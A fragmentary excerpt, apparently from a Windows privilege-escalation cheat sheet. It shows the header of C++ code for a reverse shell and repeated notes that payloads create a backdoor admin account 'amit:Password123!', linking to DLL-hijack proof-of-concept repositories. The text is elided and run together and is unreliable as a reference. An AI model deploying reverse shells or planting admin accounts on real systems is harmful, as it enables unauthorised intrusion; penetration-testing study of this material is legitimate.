...
```cpp
#include <winsock2.h>#include <windows.h>#include <ws2tcpip.h>#include <stdio.h>#pragma comment(lib, "ws2_32.lib")// Function to handle the reverse shell
...
**Explanation** It will create a new admin user: `amit:Password123!`.
...
**Explanation** It will create a new admin user: `amit:Password123!`, see the [GitHub reference](https://github.com/gustanini/DLL-Hijack-POC/tree/main).
...
**Explanation** It will create a new admin user: `amit:Password123!`, see the [GitHub reference](https://github.com/newsoft/adduser/blob/master/adduser.c).
